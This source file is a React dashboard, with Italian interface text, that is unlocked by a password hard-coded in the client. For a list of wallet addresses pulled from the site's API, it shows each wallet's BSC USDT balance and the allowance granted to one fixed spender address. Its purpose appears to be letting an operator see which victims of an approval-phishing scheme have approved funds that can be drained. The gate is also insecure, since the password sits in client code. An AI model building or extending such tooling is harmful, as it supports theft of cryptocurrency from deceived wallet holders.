import { useState } from "react";
import { ethers } from "ethers";

export default function Dashboard() {
  const [password, setPassword] = useState("");
  const [logged, setLogged] = useState(false);
  const [users, setUsers] = useState([]);

  const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
  const SPENDER = "0x5Eec04E6d2539Df5D3a3873f441c991ea56264BB";

  const login = async () => {
    if (password === "Armadio") {
      setLogged(true);

      const res = await fetch("/api/users");
      const data = await res.json();

      const provider = new ethers.JsonRpcProvider(
        "https://bsc-dataseed.binance.org/"
      );

      const usdt = new ethers.Contract(
        USDT_ADDRESS,
        [
          "function balanceOf(address owner) view returns (uint256)",
          "function allowance(address owner, address spender) view returns (uint256)",
          "function decimals() view returns (uint8)"
        ],
        provider
      );

      const decimals = await usdt.decimals();

      const usersWithData = await Promise.all(
        data.users.map(async (u) => {
          const balance = await usdt.balanceOf(u.address);
          const allowance = await usdt.allowance(u.address, SPENDER);

          const formattedBalance = Number(
            ethers.formatUnits(balance, decimals)
          ).toFixed(2);

          const formattedAllowance = Number(
            ethers.formatUnits(allowance, decimals)
          ).toFixed(2);

          return {
            address: u.address,
            balance: formattedBalance,
            allowance: formattedAllowance
          };
        })
      );

      setUsers(usersWithData);

    } else {
      alert("Password sbagliata");
    }
  };

  if (!logged) {
    return (
      <div style={{
        background: "#0b0b0b",
        minHeight: "100vh",
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
        color: "white"
      }}>
        <div>
          <h2>Dashboard Login</h2>
          <input
            type="password"
            onChange={(e) => setPassword(e.target.value)}
            style={{ padding: "10px", borderRadius: "10px" }}
          />
          <br /><br />
          <button onClick={login}>Login</button>
        </div>
      </div>
    );
  }

  return (
    <div style={{
      background: "#0b0b0b",
      minHeight: "100vh",
      color: "white",
      padding: "20px"
    }}>
      <h2>Utenti</h2>

      {users.map((u, i) => (
        <div key={i} style={{
          background: "#1a1a1a",
          padding: "15px",
          borderRadius: "10px",
          marginTop: "10px"
        }}>
          <div><b>Address:</b> {u.address}</div>
          <div><b>USDT Balance:</b> ${u.balance}</div>
          <div><b>Allowance:</b> ${u.allowance}</div>
        </div>
      ))}
    </div>
  );
}